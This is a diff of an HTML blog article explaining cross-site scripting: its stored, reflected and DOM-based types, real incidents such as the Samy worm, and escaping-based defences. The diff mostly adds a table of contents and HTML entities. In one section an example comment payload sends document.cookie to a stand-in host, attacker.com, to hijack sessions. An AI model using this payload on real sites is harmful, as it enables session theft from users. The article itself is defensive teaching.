@@ -102,22 +102,28 @@ MathJax.Hub.Queue(function() {
 </div>
 
 <div class="row">
-        <div class="col-sm-8 col-md-8 col-md-offset-2 article-content" id="contentAfterTitle">
+    <div class="col-sm-2 col-md-2 table-of-content">
+        <nav>
+        <h4>Contents</h4>
+        <div id="toc"><ul><li><a class="toc-href" href="#" title="Cross-site Scripting (XSS) 😈">Cross-site Scripting (XSS) 😈</a><ul><li><a class="toc-href" href="#why-it-matters" title="Why it Matters">Why it Matters</a></li><li><a class="toc-href" href="#how-are-xss-attacks-executed" title="How are XSS attacks executed?">How are XSS attacks executed?</a></li><li><a class="toc-href" href="#what-can-i-do-to-prevent-xss-attacks" title="What can I do to prevent XSS attacks?">What can I do to prevent XSS attacks?</a></li><li><a class="toc-href" href="#see-also" title="See also">See also</a></li><li><a class="toc-href" href="#whats-next" title="What&rsquo;s next?">What&rsquo;s next?</a></li></ul></li></ul></div>
+        </nav>
+    </div>
+    <div class="col-sm-8 col-md-8 article-content" id="contentAfterTitle">
 
             
-            <p>Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users’ machine.</p>
+            <p>Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users&rsquo; machine.</p>
 <p>Various types of XSS are distinguished:</p>
 <ul>
 <li><strong>Stored XSS</strong>: The attacker can make the website store the XSS, e.g. by crafting a comment on Facebook or a chat message on Twitch which contains the malicious message. The malicious message is then delivered to every new client which accesses the page.</li>
 <li><strong>Reflected XSS</strong>: Some websites allow you to create links that you can share. For example, a Google search. The URL contains the search term and if somebody clicks on that link, Google will show the search term from the link on the page. So Google reflects a parameter of the link on the page. If an attacker changes the search term to contain code, that code could potentially be executed by the browser of any user who clicks on the link.</li>
-<li><strong>DOM-based XSS</strong>: In modern web applications the logic is mostly in the client. This means the attacker does not have to go to the server-side to do harm. The on-site JavaScript is attacked. In contrast to the reflected XSS, the server didn’t directly cause the issue. The (valid) JavaScript on the page read the attack.</li>
+<li><strong>DOM-based XSS</strong>: In modern web applications the logic is mostly in the client. This means the attacker does not have to go to the server-side to do harm. The on-site JavaScript is attacked. In contrast to the reflected XSS, the server didn&rsquo;t directly cause the issue. The (valid) JavaScript on the page read the attack.</li>
 </ul>
 <p>The <strong>attack surface</strong> is pretty big for modern websites. Any user-supplied
 data can contain an XSS attack. It could be a comments section, advertisement,
-the document.referrer, URL fragments, …</p>
+the document.referrer, URL fragments, &hellip;</p>
 <h2 id="why-it-matters">Why it Matters</h2>
 <ul>
-<li>XSS is part of the <a href="https://owasp.org/www-project-top-ten/">OWASP Top-10</a>, meaning it’s recognized as a common vulnerability</li>
+<li>XSS is part of the <a href="https://owasp.org/www-project-top-ten/">OWASP Top-10</a>, meaning it&rsquo;s recognized as a common vulnerability</li>
 <li>There are <strong>14,625 CVE entries for XSS</strong> vulnerabilities on mitre.org (<a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site">source</a>)</li>
 <li><strong>2005</strong>: MySpace had a worm called <a href="https://en.wikipedia.org/wiki/Samy_(computer_worm)">Samy</a>. Within 20 hours, the author got one million users to friend him (<a href="https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever">source</a>). <strong>MySpace had to take the site down because of this XSS attack.</strong></li>
 <li><strong>2011</strong>: Facebook worm allows automatic wall posts (<a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6c4ddf17-8e6d-4e92-8bec-f918cbf61afc&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments">source</a>)</li>
@@ -129,7 +135,7 @@ the document.referrer, URL fragments, …</p>
 <li><strong>2020</strong>: Facebook paid <strong>$20,000</strong> for finding an XSS attack (<a href="https://portswigger.net/daily-swig/xss-vulnerability-in-login-with-facebook-button-earns-20-000-bug-bounty">source</a>).</li>
 <li><strong>2020</strong>: Tumblr was vulnerable to a DOM-based XSS attack (<a href="https://hackerone.com/reports/882546">source</a>). Automattic paid $350 for it.</li>
 </ul>
-<p><img alt="Photo by Aarón Blanco Tejedor on Unsplash" src="https://cdn-images-1.medium.com/max/9856/0*ExwQ55rXgbShCgmN"><em>Photo by <a href="https://unsplash.com/@healing_photographer?utm_source=medium&amp;utm_medium=referral">Aarón Blanco Tejedor</a> on <a href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral">Unsplash</a></em></p>
+<p><img alt="Photo by Aar&oacute;n Blanco Tejedor on Unsplash" src="https://cdn-images-1.medium.com/max/9856/0*ExwQ55rXgbShCgmN"/><em>Photo by <a href="https://unsplash.com/@healing_photographer?utm_source=medium&amp;utm_medium=referral">Aar&oacute;n Blanco Tejedor</a> on <a href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral">Unsplash</a></em></p>
 <h2 id="how-are-xss-attacks-executed">How are XSS attacks executed?</h2>
 <p>There are various ways attackers can do harm: They can <strong>make the website
 unusable</strong> if the XSS script is on it. They can run a <strong>cryptocurrency miner</strong>.
@@ -141,21 +147,20 @@ to posts. We assume that the comments are just taken as is and copied to
 everybody who opens the page. The comment we make is</p>
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
     <span class="nx">image</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
-    <span class="nx">image</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;[https://attacker.com/steal?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">](</span><span class="nx">https</span><span class="o">:</span><span class="c1">//attacker.com/?&#39;+document.cookie);</span>
+    <span class="nx">image</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">'[https://attacker.com/steal?cookie='</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">](</span><span class="nx">https</span><span class="o">:</span><span class="c1">//attacker.com/?'+document.cookie);</span>
 <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
-
-<p>You can see that this will not do anything — for the other users, this will
+<p>You can see that this will not do anything &mdash; for the other users, this will
 just look like an empty message. It will not refresh the page. It will not open
 another window. But it will call http://attacker.com/steal with a GET request
 which has a cookie parameter. Hence on the side of the attacker there only
 needs to be a web server that is reachable and logs those requests. After that,
 the attacker can use the cookie and impersonate the victim. The attacker
-doesn’t know the victims' credentials but hijacked the session instead.</p>
+doesn&rsquo;t know the victims' credentials but hijacked the session instead.</p>
 <h2 id="what-can-i-do-to-prevent-xss-attacks">What can I do to prevent XSS attacks?</h2>
 <p>Never blindly trust user data. Remove potentially harmful parts, escape parts
 that will change the expected output. You might want to remove and <code>&lt;script&gt;</code>
-tags or replace <code>&lt;</code> by <code>&amp;lt;</code>. It’s not enough, though. You can also execute
+tags or replace <code>&lt;</code> by <code>&amp;lt;</code>. It&rsquo;s not enough, though. You can also execute
 JavaScript with the
 <a href="https://www.w3schools.com/jsref/event_onload.asp">onload attribute</a>. That
 attribute can be added to many or even all HTML tags.</p>
@@ -170,22 +175,22 @@ attribute can be added to many or even all HTML tags.</p>
 <li>Rust: <a href="https://docs.rs/htmlescape/0.3.1/htmlescape/fn.encode_minimal.html">htmlescape::encode_miniaml</a></li>
 </ul>
 <p>Also, make sure you do that as early as possible. There should be a secure way
-to use data from the database — and that should not require to know that there
+to use data from the database &mdash; and that should not require to know that there
 is potentially harmful data within it. So escape the data before you put it in
 the DB. Make sure escaping is
-<a href="https://en.wikipedia.org/wiki/Idempotence">idempotent</a> — escaping two times
+<a href="https://en.wikipedia.org/wiki/Idempotence">idempotent</a> &mdash; escaping two times
 should be the same as escaping once. If you really think you need the original
 somewhere, you can have a _raw field in the database. Or you have a data access
 layer (DAL) that takes care of the escaping.</p>
-<p>Remember to <strong>sanitize ALL user inputs</strong>, not only stuff that was in input fields. Don’t forget about <a href="https://martin-thoma.com/tags.html#klausur-ref">URL fragments</a> and <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer">Document.referrer</a> .</p>
+<p>Remember to <strong>sanitize ALL user inputs</strong>, not only stuff that was in input fields. Don&rsquo;t forget about <a href="https://martin-thoma.com/tags.html#klausur-ref">URL fragments</a> and <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer">Document.referrer</a> .</p>
 <h2 id="see-also">See also</h2>
 <p>I love <a href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)">Tom Scott</a> and <a href="https://www.youtube.com/user/Computerphile">Computerphile</a> and they made a video about the topic!</p>
-<p><center><iframe width="560" height="315" src="https://www.youtube.com/embed/L5l9lSnNMxg" frameborder="0" allowfullscreen></iframe></center></p>
-<h2 id="whats-next">What’s next?</h2>
+<p><center><iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/L5l9lSnNMxg" width="560"></iframe></center></p>
+<h2 id="whats-next">What&rsquo;s next?</h2>
 <p>In this series about application security (AppSec) we already explained some of the techniques of the attackers 😈 and also techniques of the defenders 😇:</p>
 <ul>
 <li>Part 1: <a href="https://medium.com/faun/sql-injections-e8bc9a14c95">SQL Injections</a> 😈</li>
-<li>Part 2: <a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80">Don’t leak Secrets</a> 😇</li>
+<li>Part 2: <a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80">Don&rsquo;t leak Secrets</a> 😇</li>
 <li>Part 3: <a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f">Cross-Site Scripting (XSS)</a> 😈</li>
 <li>Part 4: <a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636">Password Hashing</a> 😇</li>
 <li>Part 5: <a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112">ZIP Bombs</a> 😈</li>
